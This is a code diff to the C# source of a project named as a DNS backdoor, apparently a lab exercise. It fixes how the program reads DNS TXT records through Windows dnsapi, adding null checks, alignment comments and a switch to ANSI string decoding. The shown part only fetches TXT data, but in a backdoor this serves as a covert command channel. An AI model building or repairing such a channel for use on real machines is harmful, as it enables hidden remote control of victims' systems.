@@ -13,10 +13,12 @@ namespace A06_6_DNS_Backdoor
         private const ushort DNS_TYPE_TEXT = 0x0010;
         private const uint DNS_QUERY_STANDARD = 0x00000000;
 
+        // Force explicit byte alignment to ensure structural predictability across platforms
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         private struct DNS_TXT_DATA
         {
             public uint dwStringCount;
+            // Explicitly define as an array pointer block matching architectural word size
             public IntPtr pStringArray;
         }
 
@@ -30,6 +32,8 @@ namespace A06_6_DNS_Backdoor
             public uint flags;
             public uint dwTtl;
             public uint dwReserved;
+            // Native alignment pads bytes between dwReserved and the structure data union block.
+            // On 64-bit systems, this ensures data pointers match 8-byte boundaries.
             public DNS_TXT_DATA Data;
         }
 
@@ -119,19 +123,30 @@ namespace A06_6_DNS_Backdoor
 
             int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);
 
+            // Status 0 indicates SUCCESS
             if (status == 0 && pResultList != IntPtr.Zero)
             {
-                // Explicitly check for null before handling unmanaged structures
                 object? unmanagedStruct = Marshal.PtrToStructure(pResultList, typeof(DNS_RECORD));
                 if (unmanagedStruct is DNS_RECORD record)
                 {
                     if (record.wType == DNS_TYPE_TEXT && record.Data.dwStringCount > 0)
                     {
-                        IntPtr pString = Marshal.ReadIntPtr(record.Data.pStringArray);
-                        string? txtResult = Marshal.PtrToStringUni(pString);
+                        // Safely evaluate the layout context before extracting string blocks
+                        if (record.Data.pStringArray != IntPtr.Zero)
+                        {
+                            // In a 64-bit environment, the structure array points to an entry containing the string data address
+                            IntPtr pStringString = Marshal.ReadIntPtr(record.Data.pStringArray);
 
-                        DnsRecordListFree(pResultList, 0);
-                        return txtResult;
+                            if (pStringString != IntPtr.Zero)
+                            {
+                                // The string returned by dnsapi.dll TXT records is parsed as Ansi/UTF-8 array format natively,
+                                // rather than Unicode wide-characters.
+                                string? txtResult = Marshal.PtrToStringAnsi(pStringString);
+
+                                DnsRecordListFree(pResultList, 0);
+                                return txtResult;
+                            }
+                        }
                     }
                 }
                 DnsRecordListFree(pResultList, 0);
